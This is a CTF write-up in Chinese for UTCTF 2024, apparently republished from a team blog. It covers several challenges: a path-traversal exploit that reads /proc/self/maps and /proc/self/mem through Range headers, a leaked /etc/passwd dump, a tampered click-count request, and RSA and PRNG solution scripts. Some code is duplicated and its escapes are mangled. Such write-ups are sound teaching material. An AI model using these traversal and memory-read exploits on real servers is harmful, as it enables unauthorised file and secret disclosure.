# UTCTF2024 WriteUp By Mini-Venom

> 原文: https://www.ctfiot.com/171127.html
> ID: 171127

招新小广告CTF组诚招re、crypto、pwn、misc、合约方向的师傅,长期招新IOT+Car+工控+样本分析多个组招人有意向的师傅请联系邮箱

admin@chamd5.org(带上简历和想加入的小组

Home on the Range

Range请求头

但是好像没什么用，就是和题目名挺吻合的。

目录遍历

from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
import os
from html import escape
from mimetypes import guess_type
import re
from random import randbytes
import signal
import sys
import threading

with open(“/setup/flag.txt”) as f:

the_flag = f.read()

os.remove(“/setup/flag.txt”)

def process_range_request(ranges, content_type, file_len, write_header, write_bytes, write_file_range):

boundary = randbytes(64).hex()

for [first, last] in (ranges if ranges != [] else [[None, None]]):

count = None

if first is None:

if last is None:

first = 0

else:

first = file_len – last

count = last

elif last is not None:

count = last – first + 1

if (count is not None and count < 0) or first < 0:

return False

content_range_header = “bytes “ + str(first) + “-“ + (str(first + count – 1 if count is not None else file_len – 1)) + “/” + str(file_len)

if len(ranges) > 1:

write_bytes(b“rn–“ + boundary.encode())

if content_type:

write_bytes(b“rnContent-Type: “ + content_type.encode())

write_bytes(b“rnContent-Range: “ + content_range_header.encode())

write_bytes(b“rnrn”)

else:

if content_type:

write_header(“Content-Type”, content_type)

if len(ranges) > 0:

write_header(“Content-Range”, content_range_header)

if not write_file_range(first, count):

return False

if len(ranges) > 1:

write_bytes(b“rn–“ + boundary.encode() + b“–rn”)

write_header(“Content-Type”, “multipart/byteranges; boundary=” + boundary)

elif len(ranges) == 0:

write_header(“Accept-Ranges”, “bytes”)

return True

class Handler(BaseHTTPRequestHandler):

def do_GET(self):

return self.try_serve_file(self.path[1:])

def try_serve_file(self, f):

if f == “”:

f = “.”

try:

status_code = 200

range_match = re.match(“^bytes=\d*-\d*(, *\d*-\d*)*$”, self.headers.get(“range”, “none”))

ranges = []

if range_match:

status_code = 206

ranges = []

for range in self.headers.get(“range”).split(“=”)[1].split(“, “):

left, right = range.split(“-“)

new_range = [None, None]

if left:

new_range[0] = int(left)

if right:

new_range[1] = int(right)

if not left and not right:

# invalid

ranges = [[None, None]]

break

ranges.append(new_range)

self.log_message(“Serving %s ranges %s”, f, repr(ranges))

(content_type, _) = guess_type(f)

with open(f, “rb”) as io:

file_length = os.stat(f).st_size

headers = []

chunks = []

def check_file_chunk(first, count):

if count is None:

if first < 0:

return False

io.seek(first)

if io.read(1) == b“”:

return False

else:

if count <= 0 or first < 0:

return False

io.seek(first + count – 1)

if io.read(1) == b“”:

return False

chunks.append({“type”: “file”, “first”: first, “count”: count})

return True

ok = process_range_request(ranges, content_type, file_length,

lambda k, v: headers.append((k, v)),

lambda b: chunks.append({“type”: “bytes”, “bytes”: b}),

check_file_chunk)

if not ok:

self.send_response(416)

self.send_header(“Content-Range”, “bytes */” + str(file_length))

self.end_headers()

return

content_length = 0

for chunk in chunks:

if chunk[“type”] == “bytes”:

content_length += len(chunk[“bytes”])

elif chunk[“type”] == “file”:

content_length += chunk[“count”] if chunk[“count”] is not None else file_length – chunk[“first”]

self.send_response(status_code)

for (k, v) in headers:

self.send_header(k, v)

self.send_header(“Content-Length”, str(content_length))

self.end_headers()

for chunk in chunks:

if chunk[“type”] == “bytes”:

self.wfile.write(chunk[“bytes”])

elif chunk[“type”] == “file”:

io.seek(chunk[“first”])

count = chunk[“count”]

buf_size = 1024 * 1024

while count is None or count > 0:

chunk = io.read(min(count if count is not None else buf_size, buf_size))

self.wfile.write(chunk)

if count is not None:

count -= len(chunk)

if len(chunk) == 0:

break

except FileNotFoundError:

print(f)

self.send_error(404)

except IsADirectoryError:

if not f.endswith(“/”) and f != “.”:

self.send_response(303)

self.send_header(“Location”, “/” + f + “/”)

self.end_headers()

elif os.path.isfile(f + “/index.html”):

return self.try_serve_file(f + “/index.html”)

else:

dir_name = os.path.basename(os.path.abspath(f))

if dir_name == “”:

dir_name = “/”

body = (

“<!DOCTYPE html><html><head><title>Directory listing of “

+ escape(dir_name)

+ “</title><body><h1>Directory listing of “ + escape(dir_name) + “</h1><ul>”

+ “”.join([“<li><a href=”” + escape(child, quote=True) + “”>” + escape(child) + “</a></li>” for child in os.listdir(f)])

+ “</ul></body></html>”

).encode(“utf-8”)

self.send_response(200)

self.send_header(“Content-Type”, “text/html; charset=utf-8”)

self.end_headers()

self.wfile.write(body)

pass

except OSError as e:

self.send_error(500, None, e.strerror)

server = ThreadingHTTPServer((“0.0.0.0”, 3000), Handler)

def exit_handler(signum, frame):

sys.stderr.write(“Received SIGTERMn”)

# Needs to run in another thread to avoid blocking the main thread

def shutdown_server():

server.shutdown()

shutdown_thread = threading.Thread(target=shutdown_server)

shutdown_thread.start()

signal.signal(signal.SIGTERM, exit_handler)

sys.stderr.write(“Server readyn”)

server.serve_forever()

with open(“/setup/flag.txt”, “w”) as f:

f.write(the_flag)

最后那个signal.SIGTERM应该是题目重启的逻辑，跟解题没关系

从/proc/self/maps来获取堆栈分布,根据堆的偏移爆破mem

# -*- coding:utf-8 -*-
import requests
import re
from tqdm import tqdm
from urllib.parse import quote
baseUrl = "http://guppy.utctf.live:7884/"
headers = {
    "Range":"bytes=40000-42000"
}
result = []
if __name__ == "__main__":
    url = baseUrl + "%2e%2e/%2e%2e/proc/self/maps"
    print(url)
    memInfoList = requests.get(url,headers=headers).text.split("n")
    mem = ""
    print(memInfoList)

for i in tqdm(memInfoList):

memAddress = re.match(r“([a-z0-9]+)-([a-z0-9]+) rw”, i)

if memAddress:

start = int(memAddress.group(1), 16)

end = int(memAddress.group(2), 16)

result.append([start,end])

infoUrl = baseUrl + “%2e%2e/%2e%2e/proc/self/mem”

newHeaders = {

“Range”:f“bytes={start}-{end}”

}

mem = requests.get(infoUrl,headers=newHeaders).text

print(mem)

if “utflag” in mem:

print(“find it”)

print(newHeaders)

break

flag在最后 find it {‘Range’: ‘bytes=124163915821056-124163919962112’}

Beginner: Basic Reversing Problem

直接把每个函数中赋值的ascll码粘出来即可

117 116 102 108 97 103 123 105 95 99 52 110 95 114 51 118 33 125


```
POST /api/absorbCompany/2 HTTP/1.1
Host: guppy.utctf.live:8725
Accept: */*
Accept-Encoding: identity
Accept-Language: zh-CN,zh;q=0.9
Content-Length: 37
Content-Type: application/json
Cookie: connect.sid=s%3A2Pg-Z6Ptae78uzMfAGEO2LQyaBUZF6yl.kVN2lVXSTr3ZQOOlz3L5K3Lbq%2BsPH7%2FyKZD25YRlTGk
Origin: http://guppy.utctf.live:8725
Referer: http://guppy.utctf.live:8725/
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
```



```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
copenhagen:x:1000:1000::/home/copenhagen:/bin/sh
```



```
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
import os
from html import escape
from mimetypes import guess_type
import re
from random import randbytes
import signal
import sys
import threading
```



```
# -*- coding:utf-8 -*-
import requests
import re
from tqdm import tqdm
from urllib.parse import quote
baseUrl = "http://guppy.utctf.live:7884/"
headers = {
    "Range":"bytes=40000-42000"
}
result = []
if __name__ == "__main__":
    url = baseUrl + "%2e%2e/%2e%2e/proc/self/maps"
    print(url)
    memInfoList = requests.get(url,headers=headers).text.split("n")
    mem = ""
    print(memInfoList)
```



```
fetch('/click', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/x-www-form-urlencoded'
                        },
                        body: 'count=' + 10000000000
                    })
                    .then(response => response.json())
                    .then(data => {
                        alert(data.flag);
                    });
```



```
from Crypto.Util.number import *
p=1025252665848145091840062845209085931
q=75575216771551332467177108987001026743883
N = 77483692467084448965814418730866278616923517800664484047176015901835675610073
e = 65537
c = 43711206624343807006656378470987868686365943634542525258065694164173101323321
phi=(p-1)*(q-1)
d=inverse_mod(e,phi)
print(long_to_bytes(int(pow(c,d,N))))
#b'utflag{just_send_plaintext}'
```



```
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Util.number import *
from tqdm import *
def get_random_number():
    global seed
    seed = int(str(seed * seed).zfill(12)[3:9])
    return seed
```



```
import itertools
from string import *
alpha_bet=ascii_lowercase
strlist = itertools.product(alpha_bet, repeat=5)
def judge(guess,answer):
```



```
hmsuu hmusu hmuus hsmuu hsumu hsuum humsu humus husmu husum huums huusm mhsuu mhusu mhuus mshuu msuhu msuuh muhsu muhus mushu musuh muuhs muush shmuu shumu shuum smhuu smuhu smuuh suhmu suhum sumhu sumuh suuhm suumh uhmsu uhmus uhsmu uhsum uhums uhusm umhsu umhus umshu umsuh umuhs umush ushmu ushum usmhu usmuh usuhm usumh uuhms uuhsm uumhs uumsh uushm uusmh
```



```
n1= 16895844090302140592659203092326754397916615877156418083775983326567262857434286784352755691231372524046947817027609871339779052340298851455825343914565349651333283551138205456284824077873043013595313773956794816682958706482754685120090750397747015038669047713101397337825418638859770626618854997324831793483659910322937454178396049671348919161991562332828398316094938835561259917841140366936226953293604869404280861112141284704018480497443189808649594222983536682286615023646284397886256209485789545675225329069539408667982428192470430204799653602931007107335558965120815430420898506688511671241705574335613090682013
e1= 65537
c1= 7818321254750334008379589501292325137682074322887683915464861106561934924365660251934320703022566522347141167914364318838415147127470950035180892461318743733126352087505518644388733527228841614726465965063829798897019439281915857574681062185664885100301873341937972872093168047018772766147350521571412432577721606426701002748739547026207569446359265024200993747841661884692928926039185964274224841237045619928248330951699007619244530879692563852129885323775823816451787955743942968401187507702618237082254283484203161006940664144806744142758756632646039371103714891470816121641325719797534020540250766889785919814382
```



```
Welcome to the signature generator!
This service generates signatures for nonnegative integer messages.
Today's RSA parameters are: 
n = 26513666256909537346234842974614985055272114808872859575465682142925156918272427186795011970182151450381367211339083690316182376464452967361419306608676636655740864118248718911375615608259238389060910647926976129117142495601574083106194091932989917398722699350731365804075485118605855632370321333813028938540767909148085850979651604021833144758917874921029219760075758222873555675853223546465885437967642690927791227460701119714776368280912971998732371928438371685265099372319763422130064421929003319053477851089249102838606015992844461271067902948925926428101149872265239163597686826063965509938225348962889469005859
e = 65537
Enter a message (enter 0 to stop): 0
You must request at least one signature.
Enter a message (enter 0 to stop): 1
Your signature is: 1
Enter a message (enter 0 to stop): 0
Now, come up with your own pair!
Enter a message: 0
Enter a signature: 1
Congrats! Here is the flag: utflag{a1m05t_t3xtb00k_3x3rc153}
```



```
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from tqdm import *
def get_random_number():
    global seed
    seed = int(str(seed * seed).zfill(12)[3:9])
    return seed
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/6-1712019794.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/3-1712019796.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/3-1712019797.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/9-1712019798.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/5-1712019799.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/2-1712019800.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/6-1712019800.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/04/5-1712019801.webp)